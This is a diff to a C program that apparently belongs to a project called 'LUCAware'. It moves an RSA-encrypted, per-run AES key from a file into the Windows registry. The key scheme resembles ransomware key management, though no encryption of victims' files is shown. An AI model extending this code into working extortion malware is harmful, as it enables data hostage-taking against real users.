@@ -1,4 +1,5 @@
 #include "get_relative_path.h"
+#include "store_in_register.h"
 
 #include <stdio.h>
 #include <stdlib.h>
@@ -18,6 +19,8 @@
 #define KEY_SIZE    16 
 #define IV_SIZE     16
 #define BUFFER_SIZE 4096
+
+storage_context_t ctx = { "Software\\LUCAware" };
 
 /* Global variables for AES key */
 
@@ -70,7 +73,7 @@ static void random_bytes(unsigned char *buf, size_t len) {
 
 
 /* Encrypt AES key with public RSA key */
-static void save_encrypted_key_rsa(const unsigned char *key, size_t key_len, const char *pubkey_file, const char *out_file) {
+static void save_encrypted_key_rsa(const unsigned char *key, size_t key_len, const char *pubkey_file) {
     mbedtls_pk_context pk;
     mbedtls_pk_init(&pk);
 
@@ -104,21 +107,12 @@ static void save_encrypted_key_rsa(const unsigned char *key, size_t key_len, con
         handle_error("RSA PKCS#1 encryption failed");
     }
 
-    /* Write encrypted key to file */
-    FILE *f = fopen(out_file, "wb");
-    if (!f) {
+    storage_context_t ctx = { "Software\\LUCAware" };
+    if (store_value(&ctx, "EncryptedKey", cipher, rsa_len) != 0) {
         free(cipher);
-        handle_error("Cannot open AES key output file");
+        handle_error("Failed to store encrypted AES key in registry");
     }
-
-    if (fwrite(cipher, 1, rsa_len, f) != rsa_len) {
-        fclose(f);
-        free(cipher);
-        handle_error("Failed to write encrypted AES key");
-    }
-
     /* Cleanup */
-    fclose(f);
     free(cipher);
     mbedtls_pk_free(&pk);
 }
@@ -135,17 +129,12 @@ static int ensure_aes_key_loaded(void)
         return 1;
     }
 
-    char aes[MAX_PATH];
-    if (get_relative_path(aes, sizeof(aes), "aes_key.bin") != 0) {
-        return 1;
-    }
-
     rng_init();
 
     /* Always generate a new key once per run */
     random_bytes(aes_key, KEY_SIZE);
 
-    save_encrypted_key_rsa(aes_key, KEY_SIZE, public_rsa, aes);
+    save_encrypted_key_rsa(aes_key, KEY_SIZE, public_rsa);
 
     key_loaded = true;
     return 0;
